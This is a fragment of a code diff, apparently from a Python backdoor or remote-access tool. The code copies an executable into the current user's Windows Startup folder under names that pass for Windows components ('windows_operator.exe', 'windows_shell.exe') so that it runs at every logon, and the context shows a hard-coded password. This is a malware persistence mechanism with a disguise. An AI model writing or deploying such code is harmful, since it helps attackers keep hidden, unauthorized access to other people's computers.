@@ -9,10 +9,10 @@ password = 'n0tm1ne'
 
 
 fromdir = os.getcwd()+'\\windows_operator.exe'
-todir = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_operator.exe'.format(getpass.getuser())
+todir = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_shell.exe'.format(getpass.getuser())
 
-firstname = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_operator.exe'.format(getpass.getuser())
-secondname = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_shell.exe'.format(getpass.getuser())
+firstname = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_shell.exe'.format(getpass.getuser())
+secondname = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_operator.exe'.format(getpass.getuser())
 
 try:
     mv = os.rename(fromdir, todir)
